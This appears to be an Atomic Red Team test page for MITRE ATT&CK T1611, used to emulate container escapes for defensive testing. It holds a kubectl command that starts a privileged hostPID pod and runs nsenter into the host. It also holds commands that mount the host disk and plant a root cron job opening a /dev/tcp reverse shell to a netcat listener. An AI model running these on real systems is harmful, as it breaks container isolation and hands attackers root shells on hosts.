---
tags: [T1611, atomic_test]
filename: "[[T1611 - Escape to Host]]"
---
# T1611 - Escape to Host

## Atomic Test #1 - Deploy container using nsenter container escape
In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.

Additional Details:
- https://twitter.com/mauilion/status/1129468485480751104
- https://securekubernetes.com/scenario_2_attack/

**Supported Platforms:** Containers


**auto_generated_guid:** 0b2f9520-a17a-4671-9dba-3bd034099fff






#### Attack Commands: Run with `sh`! 


```sh
kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

#### Cleanup Commands:
```sh
kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
```



#### Dependencies:  Run with `sh`!
##### Description: Verify docker is installed.
##### Check Prereq Commands:
```sh
which docker
```
##### Get Prereq Commands:
```sh
if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
```
##### Description: Verify docker service is running.
##### Check Prereq Commands:
```sh
sudo systemctl status docker
```
##### Get Prereq Commands:
```sh
sudo systemctl start docker
```
##### Description: Verify kind is in the path.
##### Check Prereq Commands:
```sh
which kind
```
##### Get Prereq Commands:
```sh
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
chmod +x ./kind
mv kind /usr/bin/kind
```
##### Description: Verify kind-atomic-cluster is created
##### Check Prereq Commands:
```sh
sudo kind get clusters
```
##### Get Prereq Commands:
```sh
sudo kind create cluster --name atomic-cluster
```
##### Description: Verify kubectl is in path
##### Check Prereq Commands:
```sh
which kubectl
```
##### Get Prereq Commands:
```sh
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x ./kubectl
mv kubectl /usr/bin/kubectl
```




<br/>
<br/>

## Atomic Test #2 - Mount host filesystem to escape privileged Docker container
This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.
The container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.
Dev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell.

**Supported Platforms:** Containers


**auto_generated_guid:** 6c499943-b098-4bc6-8d38-0956fc182984





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| mount_device | Path to the device of the host's disk to mount | path | /dev/dm-0|
| mount_point | Path where the host filesystem will be mounted | path | /mnt/T1611.002|
| cron_path | Path on the host filesystem where cron jobs are stored | path | /etc/cron.d|
| cron_filename | Filename of the cron job in cron_path | string | T1611_002|
| listen_address | IP address to listen for callback from the host system. | string | `ifconfig eth0 | grep inet | awk '{print $2}'`|
| listen_port | TCP Port to listen on for callback from the host system. | integer | 4444|


#### Attack Commands: Run with `sh`!  Elevation Required (e.g. root or admin) 


```sh
if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi
echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}
echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}
echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}
netcat -l -p #{listen_port} 2>&1
```

#### Cleanup Commands:
```sh
rm #{mount_point}#{cron_path}/#{cron_filename}
umount #{mount_point}
rmdir #{mount_point}
```



#### Dependencies:  Run with `sh`!
##### Description: Verify mount is installed.
##### Check Prereq Commands:
```sh
which mount
```
##### Get Prereq Commands:
```sh
if [ "" == "`which mount`" ]; then echo "mount Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install mount ; elif [ -n "`which yum`" ]; then sudo yum -y install mount ; fi ; else echo "mount installed"; fi
```
##### Description: Verify container is privileged.
##### Check Prereq Commands:
```sh
capsh --print | grep cap_sys_admin
```
##### Get Prereq Commands:
```sh
if [ "`capsh --print | grep cap_sys_admin`" == "" ]; then echo "Container not privileged.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
```
##### Description: Verify mount device (/dev/dm-0) exists.
##### Check Prereq Commands:
```sh
ls #{mount_device}
```
##### Get Prereq Commands:
```sh
if [ ! -f #{mount_device} ]; then echo "Container not privileged or wrong device path.  Re-start container in insecure state.  Docker: run with --privileged flag.  Kubectl, add securityContext: privileged: true"; fi
```
##### Description: Netcat is installed.
##### Check Prereq Commands:
```sh
which netcat
```
##### Get Prereq Commands:
```sh
if [ "" == "`which netcat`" ]; then echo "netcat Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install netcat ; elif [ -n "`which yum`" ]; then sudo yum -y install netcat ; fi
```
##### Description: IP Address is known.
##### Check Prereq Commands:
```sh
if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
```
##### Get Prereq Commands:
```sh
if [ "" == "`which ifconfig`" ]; then echo "ifconfig Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install net=tools ; elif [ -n "`which yum`" ]; then sudo yum -y install net-tools ; fi
```




<br/>
